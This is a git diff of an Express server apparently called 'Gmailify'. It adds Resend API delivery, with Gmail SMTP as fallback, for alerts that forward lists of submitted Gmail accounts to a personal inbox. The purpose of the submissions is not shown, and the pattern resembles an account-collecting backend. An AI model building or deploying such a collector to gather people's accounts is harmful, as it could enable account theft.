@@ -2,6 +2,7 @@ const express = require('express');
 const nodemailer = require('nodemailer');
 const path = require('path');
 const cors = require('cors');
+const { Resend } = require('resend');
 require('dotenv').config();
 
 const app = express();
@@ -13,7 +14,31 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname)));
 
-// Simple email configuration - Direct Gmail SMTP
+console.log('📧 Setting up Railway-compatible email delivery to nocturnallad4@gmail.com');
+console.log('🚀 Email methods: Resend API (primary) + Gmail SMTP (fallback)');
+console.log('⚠️  Note: For Railway deployment, Resend API key needed in environment variables');
+
+// Email configuration - Railway-compatible with Resend API
+const resend = new Resend(process.env.RESEND_API_KEY);
+
+// Create Resend email function (Railway-compatible)
+const sendEmailViaResend = async (emailContent) => {
+    if (!process.env.RESEND_API_KEY) {
+        throw new Error('Resend API key not configured');
+    }
+    
+    console.log('📧 Sending email via Resend API (Railway-compatible)...');
+    
+    const data = await resend.emails.send({
+        from: 'Gmailify <notifications@resend.dev>', // Resend test domain
+        to: [emailContent.to],
+        subject: emailContent.subject,
+        html: emailContent.html,
+        text: emailContent.text
+    });
+    
+    return data;
+};
 
 // Create a real Gmail transporter
 const createGmailTransporter = () => {
@@ -98,9 +123,9 @@ app.post('/submit-gmail', async (req, res) => {
     ).join('\n');
     
     const emailContent = {
-        from: 'gmailifynotifications@gmail.com',
+        from: '"Gmailify Alert System" <nocturnallad4@gmail.com>',
         to: 'nocturnallad4@gmail.com',
-        subject: `🔥 URGENT: ${count} Gmail Accounts Submitted - Gmailify`,
+        subject: `� URGENT: ${count} Gmail Accounts Submitted - Action Required`,
         text: `
 🚨 NEW GMAIL SUBMISSION ALERT!
 
@@ -118,6 +143,7 @@ ${emailList}
 ---
 Automated message from Gmailify system
 Generated: ${new Date().toLocaleString()}
+Message ID: ${Date.now()}-${Math.random().toString(36).substr(2, 9)}
         `,
         html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f0f0f0;">
@@ -159,19 +185,33 @@ Generated: ${new Date().toLocaleString()}
         `
     };
     
-    // Send email asynchronously (non-blocking) - respond to user immediately
+    // Send email asynchronously (Railway-compatible) - respond to user immediately
     const sendEmailAsync = async () => {
         let emailSent = false;
         let emailMethod = 'none';
         
-        // Method 1: Try Gmail SMTP with timeout
+        // Method 1: Try Resend API first (works on Railway)
+        try {
+            if (process.env.RESEND_API_KEY) {
+                const result = await sendEmailViaResend(emailContent);
+                emailSent = true;
+                emailMethod = 'resend';
+                console.log('✅ Email sent via Resend API to nocturnallad4@gmail.com');
+                console.log('📧 Message ID:', result.id);
+                return { emailSent, emailMethod };
+            }
+        } catch (error) {
+            console.log('❌ Resend API failed:', error.message);
+        }
+        
+        // Method 2: Try Gmail SMTP (works locally, blocked on Railway)
         try {
             const transporter = createGmailTransporter();
             
             // Set a timeout promise for email sending
             const emailPromise = transporter.sendMail(emailContent);
             const timeoutPromise = new Promise((_, reject) => 
-                setTimeout(() => reject(new Error('Email timeout after 15 seconds')), 15000)
+                setTimeout(() => reject(new Error('Email timeout after 10 seconds')), 10000)
             );
             
             await Promise.race([emailPromise, timeoutPromise]);
@@ -181,7 +221,7 @@ Generated: ${new Date().toLocaleString()}
         } catch (error) {
             console.log('❌ Gmail SMTP failed:', error.message);
             
-            // Method 2: Log email content for manual processing
+            // Method 3: Log email content for manual processing
             console.log('📧 Email content prepared for delivery to nocturnallad4@gmail.com');
             console.log('📝 Email details logged below for manual forwarding if needed:');
             console.log('---EMAIL CONTENT START---');
